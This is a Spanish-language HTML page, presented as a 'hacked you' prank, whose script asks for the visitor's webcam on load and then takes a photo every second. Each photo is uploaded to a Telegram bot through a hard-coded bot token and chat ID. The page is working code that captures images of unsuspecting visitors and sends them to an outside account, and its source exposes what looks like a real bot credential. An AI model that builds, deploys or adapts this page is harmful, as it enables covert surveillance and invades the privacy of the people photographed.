<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Â¡TE HACKEÃ‰!</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        
        h1 {
            font-size: 3em;
            text-shadow: 0 0 10px #0f0;
            animation: glitch 1s infinite;
        }
        
        p {
            font-size: 1.5em;
            margin: 20px;
        }
        
        .matrix {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            opacity: 0.3;
        }
        
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-5px, 5px); }
            40% { transform: translate(-5px, -5px); }
            60% { transform: translate(5px, 5px); }
            80% { transform: translate(5px, -5px); }
            100% { transform: translate(0); }
        }
        
        #camera-feed {
            display: none;
        }
        
        #counter {
            font-size: 2em;
            color: red;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <canvas id="matrix" class="matrix"></canvas>
    <h1>Â¡TE HACKEÃ‰! ðŸš¨</h1>
    <p>He accedido a tu cÃ¡mara y estoy enviando fotos a mi servidor...</p>
    <p id="counter">Fotos enviadas: 0</p>
    
    <video id="camera-feed" autoplay></video>
    <canvas id="photo-canvas" style="display: none;"></canvas>
    
    <script>
        // Configura tu bot de Telegram aquÃ­
        const BOT_TOKEN = "7603508622:AAHduDcxlylbwFxpH7YpC02UJT43R31wmuk"; // Reemplaza con tu token de bot
        const CHAT_ID = "8064474906";    // Reemplaza con tu chat_id
        
        let photoCount = 0;
        const counter = document.getElementById('counter');
        const video = document.getElementById('camera-feed');
        const canvas = document.getElementById('photo-canvas');
        const ctx = canvas.getContext('2d');
        
        // Efecto Matrix de fondo
        const matrixCanvas = document.getElementById('matrix');
        const matrixCtx = matrixCanvas.getContext('2d');
        matrixCanvas.width = window.innerWidth;
        matrixCanvas.height = window.innerHeight;
        
        const chars = "01";
        const fontSize = 14;
        const columns = matrixCanvas.width / fontSize;
        const drops = [];
        
        for (let i = 0; i < columns; i++) {
            drops[i] = 1;
        }
        
        function drawMatrix() {
            matrixCtx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            matrixCtx.fillRect(0, 0, matrixCanvas.width, matrixCanvas.height);
            
            matrixCtx.fillStyle = '#0f0';
            matrixCtx.font = fontSize + 'px monospace';
            
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                matrixCtx.fillText(text, i * fontSize, drops[i] * fontSize);
                
                if (drops[i] * fontSize > matrixCanvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                
                drops[i]++;
            }
        }
        
        setInterval(drawMatrix, 33);
        
        // Acceso a la cÃ¡mara
        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                setTimeout(() => {
                    takeAndSendPhoto(); // Primera foto
                    setInterval(takeAndSendPhoto, 1000); // Foto cada segundo
                }, 2000);
            } catch (err) {
                console.error("Error al acceder a la cÃ¡mara:", err);
                document.body.innerHTML += `<p style="color:red;">Error: No se pudo acceder a la cÃ¡mara.</p>`;
            }
        }
        
        // Tomar foto y enviar a Telegram
        async function takeAndSendPhoto() {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const photoData = canvas.toDataURL('image/jpeg');
            photoCount++;
            counter.textContent = `Fotos enviadas: ${photoCount}`;
            
            // Enviar a Telegram (usando un servidor proxy si no estÃ¡s en HTTPS)
            try {
                const formData = new FormData();
                const blob = await (await fetch(photoData)).blob();
                formData.append('photo', blob, `hacked-photo-${photoCount}.jpg`);
                
                // Usamos un proxy si no estÃ¡ en HTTPS
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                if (!result.ok) {
                    console.error("Error al enviar foto:", result);
                }
            } catch (err) {
                console.error("Error al enviar foto:", err);
            }
        }
        
        // Iniciar la broma
        startCamera();
    </script>
</body>
</html>
